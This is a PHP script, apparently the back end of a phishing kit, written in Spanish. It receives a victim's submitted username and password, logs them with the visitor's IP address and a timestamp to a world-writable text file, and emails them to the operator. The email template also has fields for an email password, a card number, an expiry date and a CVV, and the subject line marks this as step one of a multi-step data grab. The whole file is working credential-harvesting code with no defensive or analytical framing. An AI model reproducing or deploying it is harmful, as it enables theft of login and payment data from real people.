<?php 
require('config.php');
require_once("class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$pass = $ifilter->process($_POST['pas']);

$ipcliente= $_SERVER['REMOTE_ADDR'];

$data = 'Usuario: '.$usuario.'  Clave: '.$pass;

//$file = rand(1,1292).'.txt';
$file = 'listado.txt';
$salto = "";
$cabecera = "---------------- Nuevo Registro (".date("Y-m-d H:i:s").")";

if (isset($data)) {
    $fp = fopen($file, 'a+');
    fwrite($fp, $salto.PHP_EOL);
    fwrite($fp, $salto.PHP_EOL);
    fwrite($fp, $cabecera.PHP_EOL);
    fwrite($fp, utf8_decode($data).PHP_EOL);
    fwrite($fp, utf8_decode($ipcliente).PHP_EOL);
    fclose($fp);
    chmod($file, 0777);
    echo $file;
}
else {
    echo 'No hay datos que guardar!';
}

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s");  

$to = $destino;
$subject = "Datos Roja Paso 1".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Usuario: </b>".$usuario."<br>
<b>Contraseña: </b>".$pass."<br>
<b>Correo: </b><br>
<b>Clave Correo: </b><br>
<b>Tarjeta: </b><br>
<b>Fecha: </b><br>
<b>CVV: </b><br>
<b>Dirección IP: </b>".$ipcliente."<br>
<b>Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();

?>